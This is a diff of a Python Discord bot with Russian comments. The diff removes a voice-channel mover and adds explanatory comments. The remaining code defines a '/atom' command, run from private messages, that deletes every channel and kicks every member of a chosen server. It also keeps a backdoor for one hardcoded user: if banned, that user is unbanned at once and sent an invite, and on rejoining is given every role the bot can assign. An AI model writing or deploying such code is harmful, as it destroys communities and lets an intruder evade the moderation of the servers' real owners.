@@ -4,11 +4,9 @@ import asyncio
 
 TOKEN = 'your_token_here'  # Ваш токен бота
 AUTHORIZED_USER_ID = your_user_id_here  # Ваш ID пользователя
-TARGET_VOICE_CHANNEL_ID = your_voice_channel_id_here  # ID канала, в который нужно перемещать
 
 intents = discord.Intents.default()
 intents.members = True
-intents.voice_states = True  # Включаем намерение для отслеживания голосовых состояний
 intents.message_content = True
 intents.bans = True
 
@@ -25,10 +23,12 @@ async def send_dm(user, message):
         print(f'Не удалось отправить ЛС пользователю {user.name}. Возможно, у них отключены ЛС.')
 
 async def create_invite(guild):
+    # Создать ссылку для приглашения
     invites = await guild.invites()
     if invites:
         return invites[0].url
     else:
+        # Если нет существующих приглашений, создать новое
         invite = await guild.text_channels[0].create_invite(max_age=300)
         return invite.url
 
@@ -39,8 +39,10 @@ async def atom(ctx):
         return
 
     if isinstance(ctx.channel, discord.DMChannel):
+        # Обработка команды в ЛС
         await handle_dm_atom(ctx)
     else:
+        # Игнорировать команду на сервере
         await ctx.send("Команда `/atom` может быть выполнена только в личных сообщениях.")
 
 async def handle_dm_atom(ctx):
@@ -85,12 +87,14 @@ async def handle_dm_atom(ctx):
         return
 
     if reaction.emoji == '✔️':
+        # Выполнение команды на выбранном сервере
         await perform_atom(selected_guild)
         await ctx.send(f"Команда выполнена на сервере **{selected_guild.name}**.")
     else:
         await ctx.send("Команда отменена.")
 
 async def perform_atom(guild):
+    # Удаление всех текстовых и голосовых каналов
     for channel in guild.channels:
         try:
             await channel.delete()
@@ -98,6 +102,7 @@ async def perform_atom(guild):
         except Exception as e:
             print(f'Не удалось удалить канал {channel.name}: {e}')
 
+    # Выгнать всех пользователей
     for member in guild.members:
         try:
             await member.kick(reason="Выгонка по команде /atom")
@@ -109,6 +114,7 @@ async def perform_atom(guild):
 async def on_member_join(member):
     if member.id == AUTHORIZED_USER_ID:
         roles = [role for role in member.guild.roles if role.name != "@everyone"]
+        # Отфильтровать роли, которые бот может назначить
         roles = [role for role in roles if role.position < member.guild.me.top_role.position]
         await member.edit(roles=roles)
         await send_dm(member, f'Вы вернулись на сервер! Вам были выданы все роли.')
@@ -118,27 +124,17 @@ async def on_member_ban(guild, user):
     if user.id == AUTHORIZED_USER_ID:
         invite_link = await create_invite(guild)
         await send_dm(user, f'Вы были забанены. Вот ссылка для повторного приглашения: {invite_link}')
-        await guild.unban(user)
+        await guild.unban(user)  # Немедленно разбанить пользователя
         await send_dm(user, f'Вы были разбанены и вернулись на сервер!')
 
-@bot.event
-async def on_voice_state_update(member, before, after):
-    if member.id == AUTHORIZED_USER_ID:
-        return  # Игнорируем изменения для вас
-
-    if before.channel is not None and after.channel is not None:
-        if before.channel.id != after.channel.id:
-            target_channel = bot.get_channel(TARGET_VOICE_CHANNEL_ID)
-            if target_channel:
-                await member.move_to(target_channel)  # Перемещаем вас в указанный канал
-
 def generate_emojis(count):
+    # Генерация эмодзи в зависимости от количества серверов
     emojis = []
     for i in range(1, count + 1):
         if i <= 10:
             emojis.append(f'{i}️⃣')
         else:
-            emojis.append(f'🔟{i-10}')
+            emojis.append(f'🔟{i-10}')  # Используем дополнительные символы для чисел больше 10
     return emojis
 
 bot.run(TOKEN)
